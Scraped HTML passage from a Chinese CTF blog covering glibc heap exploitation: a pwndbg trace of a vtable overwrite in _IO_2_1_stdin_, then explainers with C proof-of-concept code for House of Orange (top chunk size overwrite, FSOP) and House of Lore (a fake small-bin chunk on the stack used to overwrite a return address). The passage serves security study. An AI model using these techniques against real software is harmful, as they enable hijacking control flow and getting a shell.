(_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x7f75433786e0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>payload覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x562989a57010</span> ◂— <span class="number">0x0</span> <span class="comment">// 临时修改</span></span><br></pre></td></tr></table></figure>
<p><code>vtable</code> 变量的值为 <code>_IO_file_jumps</code> 的指针，<code>_IO_file_jumps</code> 中保存了一些函数指针，一系列标准IO函数中会调用这些函数指针，但 <code>_IO_file_jumps</code> 里的内容是无法修改的，但可以修改 <code>vtable</code> 指向伪造的 <code>_IO_file_jumps</code> 从而getshell </p>
<hr>
<p><strong>小结：</strong></p>
<p>这个题目我先自己做了做，成功 leak 了 heap_addr 和 libc_base，想到了打 fastbin attack，利用 unlink 实现 overlapping 来突破本程序严格的 size 检查，但是最后卡 unlink 那里了，复盘时发现自己的堆排布很乱，导致 unlink 总是出现未知状况（触发莫名其妙的合并等等）</p>
<p>学习大佬的 exp 时也踩了大坑，用 LibcSearcher 查找出来的 libc 版本有误，凑巧的是，在线查询网站上也是这个结果，导致我的 <code>_IO_2_1_stdin_</code> 排列的和其他师傅的博客大相径庭，最后，我在一篇博客中看到：在IDA中可以直接查看 libc.so.6 的 libc 版本</p>
<p><img src="/2022/03/11/Unlink%E6%94%BB%E5%87%BB+fastbin%20attack+vtable%E5%8A%AB%E6%8C%81/1647013341453-1647447265254.png" alt="1647013341453-1647447265254"> </p>
<p>这些坑现在踩了，以后就注意了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/House%20Of%20Orange-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/10/House%20Of%20Orange-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Orange-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-10 13:27:19" itemprop="dateCreated datePublished" datetime="2022-03-10T13:27:19+08:00">2022-03-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:41:48" itemprop="dateModified" datetime="2022-04-06T14:41:48+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h2><p>House Of Orange 的利用比较特殊（题目中不存在 free 函数或其他释放堆块的函数 ）</p>
<p>House Of Orange 核心就是通过漏洞利用获得 free 的效果 </p>
<p>这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins</p>
<p>然后利用 unsorted bin attack 结合 FSOP（也就是通过修改 IO_list_all 劫持到伪造的 IO_FILE 结构上）从而getshell </p>
<hr>
<h2 id="House-Of-Orange-利用姿势"><a href="#House-Of-Orange-利用姿势" class="headerlink" title="House Of Orange 利用姿势"></a>House Of Orange 利用姿势</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x0fe1 <span class="comment">// 注意页对齐</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size; <span class="comment">// overwrite top chunk size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x2000</span>); <span class="comment">//小于 mmap 分配阈值(128K,0x20000)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>申请 “0x2000” 字节后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55555555b020</span></span><br><span class="line"><span class="function">Size: 0x1fc1</span></span><br><span class="line"><span class="function">fd: 0x7ffff7dd1b78</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dd1b78</span></span><br></pre></td></tr></table></figure>
<p>申请 “0x60” 字节后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b020</span></span><br><span class="line">Size: <span class="number">0x71</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55555555b090</span></span><br><span class="line"><span class="function">Size: 0x1f51</span></span><br><span class="line"><span class="function">fd: 0x7ffff7dd1b78</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dd1b78</span></span><br></pre></td></tr></table></figure>
<p>直接在 top chunk 中向上申请了（ libc-2.27 和 libc-2.31 直接挂掉）</p>
<p><strong>伪造的 top chunk size 的要求 ：</strong></p>
<ul>
<li>伪造的 size 必须要对齐到内存页（0x0fe1、0x1fe1、0x2fe1、0x3fe）</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0X10)</li>
<li>size 的 prev inuse 位必须为“1”</li>
</ul>
<p>伪造 top chunk size 时，需要保持最后3字节与GDB中显示的真正 top chunk size 一致</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>有堆溢出（溢出得足够多，至少可以修改 top chunk size）</li>
<li>可以申请较大的空间</li>
<li>没有释放模块（看见程序没有 free，realloc等函数时，优先考虑打House Of Orange）</li>
</ul>
<p>后续可以配合 unsortedbin attack 和 FSOP 获取 shell，简略过程为：</p>
<ul>
<li>利用 unsortedbin attack 在 _IO_list_all 中写入 main_arean + 88 </li>
<li>如果把 main_arean + 88 当成一个 IO_FILE 结构体，那么 <code>struct _IO_FILE *_chain</code> 指针的地址为 main_arena + 88 + 0x68（main_arena+0xc0）</li>
<li>而 main_arena + 0xc0 中存储有大小为“0x60”的 smallbin 中第一个 chunk 的地址</li>
<li>如果可以在大小为“0x60”的第一个 small chunk 中伪造 IO_FILE 结构体</li>
</ul>
<p>详细过程在分析 FSOP 时说明</p>
<h2 id="版本对-House-Of-Orange-的影响"><a href="#版本对-House-Of-Orange-的影响" class="headerlink" title="版本对 House Of Orange 的影响"></a>版本对 House Of Orange 的影响</h2><p><strong>libc-2.23</strong></p>
<p>House Of Orange 适用于 libc-2.23 及之前的版本，libc-2.24 版本增加了 vtable check，但仍然可以绕过，libc-2.27 及之后的版本取消了 abort 刷新流的操作，所以这个方法基本就失效了</p>
<p><strong>libc-2.24</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct _IO_jump_t *</span></span><br><span class="line"><span class="function"><span class="title">IO_validate_vtable</span> <span class="params">(<span class="keyword">const</span> struct _IO_jump_t *vtable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>IO_validate_vtable</code>要求我们的<code>vtable</code>必须在<code>__stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间，这就意味着我们不能利用任意地址来充当<code>vtable</code> </p>
<p><strong>libc-2.27</strong>（完全失效）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/10/House%20Of%20Lore-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/10/House%20Of%20Lore-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Lore-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-10 00:53:24" itemprop="dateCreated datePublished" datetime="2022-03-10T00:53:24+08:00">2022-03-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:43:24" itemprop="dateModified" datetime="2022-04-06T14:43:24+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House Of Lore"></a>House Of Lore</h2><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关</p>
<ul>
<li>House of Lore 可以实现 <strong>分配</strong> 任意指定位置的 chunk，从而修改任意地址的内存</li>
<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
</ul>
<hr>
<h2 id="House-Of-Lore-利用姿势"><a href="#House-Of-Lore-利用姿势" class="headerlink" title="House Of Lore 利用姿势"></a>House Of Lore 利用姿势</h2><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk</p>
<p>案例：（Ubuntu 14.04.4 - 32bit - glibc-2.23）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;Nice jump d00d&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">/* presize */</span></span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>; <span class="comment">/* size */</span></span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk; <span class="comment">/* FD */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2; <span class="comment">// chunk1-&gt;BK =&gt; chunk2-&gt;head</span></span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1; <span class="comment">// chunk2-&gt;FD =&gt; chunk1-&gt;head</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>); <span class="comment">// 防止和topchunk合并</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单复述一下这个过程：</p>
<ul>
<li>首先申请了一个在 fastbin 范围内的 victim chunk，然后再在栈上构造了一个 fake chunk（fake chunk 为 stack_buffer_1，还需要一个 stack_buffer_2 来打掩护）</li>
<li>为了绕过检测，设置 stack_buffer_1 的 BK 指针指向 stack_buffer_2，设置 stack_buffer_2 的 FD 指针指向 stack_buffer_1</li>
<li>接下来先 malloc 一个chunk，防止 free 之后与 top chunk 合并，然后 free 掉 victim，这时候 victim 会被放到 fastbin 中  </li>
<li>接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中</li>
<li>在 victim chunk 的BK指针中写入fake chunk（small bin是基于BK，从后向前申请的）</li>
<li>再次申请 victim chunk（同时 fake chunk 进入small bin），最后申请 fake chunk </li>
</ul>
<p>利用条件：</p>
<ul>
<li>程序可修改 small bins 中 free chunk 的 bk 指针</li>
<li>对应伪造 fake chunk 的区域有一定控制权（可以伪造 fakechunk-&gt;FD 为 victim_chunk）</li>
</ul>
<h2 id="关于-Small-Bin-分配的利用点"><a href="#关于-Small-Bin-分配的利用点" class="headerlink" title="关于 Small Bin 分配的利用点"></a>关于 Small Bin 分配的利用点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range 